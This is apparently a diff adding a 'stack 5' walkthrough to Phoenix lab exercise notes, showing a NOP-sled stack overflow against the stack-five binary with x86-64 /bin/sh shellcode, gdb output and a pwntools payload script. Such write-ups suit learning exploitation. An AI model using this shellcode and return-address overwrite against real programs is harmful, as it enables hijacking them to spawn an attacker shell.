@@ -105,3 +105,74 @@ int main(int argc, char **argv) {
 	  ```
 	  python -c 'print("A" * 88 + "\x1d\x06\x40")' | ./stack-four
 	  ```
+## stack 5
+
+- In this challenge one has to inject the the shell code which will return a /bin/sh shell $
+- How to approach the problem:
+  1- Inject the shellcode on the stack.
+  2- change the return address and point it towards the shell code
+  3- lastly the shell will execute.
+
+- Procedure of Payload creation:
+		1- first copy a shell code from the internet and convert it into little endian hex format:
+   		```
+	'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff' \
+	'\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'	
+	```
+		2- In the begining of the buffer according to your choice add the NOP -> No operation in the stack:
+			```
+		'\x90' * 30 // here hex for NOP is \x90 and 30 is number of times we want to insert it.
+		```
+		3- after adding the NOP now add the shellcode which is defined previously.
+		4- The Purpose of NOP is to make the shell land where we want to land it and exclude any discrepancy which comes 
+		in the way.
+		5- keep in the view that total lenth of buffer is 128, of which we 30 has been defined for the NOP operators.
+		6- after the NOP code and shellcode, add the buffer over flow script which is:
+			```
+		python -c 'print("A" * 98)' // we are multipling it with 98 because 30 are already allocated.
+		```
+		7- At last overwrite the value of RBP buffer to 8 bit digits as BBBBBBBB.
+		8- open the executable in the gdb and set the break point after the gets() function in the 
+		start_level function.
+		9- then run the code as:
+		```
+		run < <(python payload.py)
+		```
+		10- open the info frame and see where is the start_level function will return after the excution:
+		```
+		gef> info frame
+		Stack level 0, frame at 0x7fffffffe520:
+		rip = 0x4005a1 in start_level; saved rip = 0x7fffffffe480
+		called by frame at 0x7fffffffe528
+		Arglist at 0x7fffffffe510, args: 
+		Locals at 0x7fffffffe510, Previous frame's sp is 0x7fffffffe520
+		Saved registers:
+		rbp at 0x7fffffffe510, rip at 0x7fffffffe518
+
+		```
+			- here is the saved rip = 0x7fffffffe480 is where the start_level will return 
+		11- Use the pwn tool 
+	
+
+		```
+			from pwn import *
+			import sys
+
+		shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff' \
+            '\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+		buff  = '\x90' * 30                 # NOP sled
+		buff += shellcode                  # Shellcode
+		buff += 'A' * (128 - len(buff))    # Padding to reach saved RBP
+		buff += 'BBBBBBBB'                 # Fake RBP
+		buff += p64(0x7fffffffe480)        # Overwritten RIP // execute the code and analyse the stack to see were your shellcode is starting and replace it with that.
+
+
+		sys.stdout.write(buff)
+
+		```
+
+To run the code:
+```
+(python payload.py; cat) | /opt/phoenix/amd64/stack-five
+```
+
